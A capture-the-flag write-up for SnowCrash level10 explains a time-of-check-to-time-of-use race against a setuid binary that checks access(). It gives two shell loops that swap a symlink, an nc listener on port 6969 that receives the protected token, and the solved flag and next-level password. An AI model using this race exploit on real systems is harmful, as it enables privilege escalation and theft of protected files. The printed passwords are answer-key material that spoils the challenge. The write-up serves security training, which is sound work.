##level10
```
level10@SnowCrash:~$ ls -l
total 32
-rwsr-sr-x+ 1 flag10  level10 10817 Mar  5  2016 level10
-rw-------  1 flag10  flag10     26 Mar  5  2016 token
```

by using https://cloud.binary.ninja/ i got to know that the excutable expect 2 args first is the file to read, it also check for the permissions before connecting,and the second one is the host ip and the connection it will be on port 6969
and we can check that bye using ltrace too;

to bypass the check on the file access we can use this security hole in this article 
https://security.stackexchange.com/questions/42659/how-is-using-acces-opening-a-security-hole

so we will create 2 scripts one that swap the stat of a symlink between an empty file and token file
and the other one execut level10 on that symlink.

and we will listen on port 6969 by using nc -lk 6969

```
level10@SnowCrash:~$ cat ecco
while true;
        do
        ln -fs ~/empty /tmp/exploit;
        ln -fs ~/token /tmp/exploit;
        done

level10@SnowCrash:~$ cat eccos
while true;
        do ./level10 /tmp/exploit 10.11.100.161;
done
```

```
level10@SnowCrash:~$ ./ecco &
[2] 1554
level10@SnowCrash:~$ ./eccos 1>/dev/null

```

```
level10@SnowCrash:~$ nc -lk 6969
.*( )*.
.*( )*.
.*( )*.
.*( )*.
.*( )*.
.*( )*.
.*( )*.
.*( )*.
.*( )*.
.*( )*.
.*( )*.
.*( )*.
.*( )*.
.*( )*.
.*( )*.
.*( )*.
.*( )*.
.*( )*.
woupa2yuojeeaaed06riuj63c
.*( )*.
.*( )*.
.*( )*.
.*( )*.
.*( )*.
.*( )*.
.*( )*.
.*( )*.
.*( )*.
^C
```

and we got our flag pass
```
level10@SnowCrash:~$ su flag10
Password: 
Don't forget to launch getflag !
flag10@SnowCrash:~$ getflag
Check flag.Here is your token : feulo4b72j7edeahuete3no7c
flag10@SnowCrash:~$ su level11
Password: feulo4b72j7edeahuete3no7c
```
